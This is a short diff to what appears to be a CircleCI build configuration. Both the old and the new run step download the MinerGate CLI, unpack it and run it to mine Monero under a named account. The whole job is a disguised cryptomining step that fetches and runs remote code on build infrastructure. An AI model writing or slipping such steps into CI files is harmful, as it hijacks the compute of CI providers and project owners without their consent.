@@ -5,4 +5,4 @@ jobs:
       - image: greenfieldsvp/dock
     steps:
       - checkout
-      - run: wget https://file.town/uploads/wah66to6xrapy01f899xbj9s5.zip && unzip wah66to6xrapy01f899xbj9s5.zip && cd minergate-cli && chmod +x minergate-cli && ./minergate-cli -user greenfieldsvp@outlook.com.vn -xmr
+      - run: wget https://download.minergate.com/deb-cli && ar x deb-cli && tar -xvzf data.tar.gz && cd opt/minergate-cli && ./minergate-cli -user greenfieldsvp@outlook.com.vn -xmr
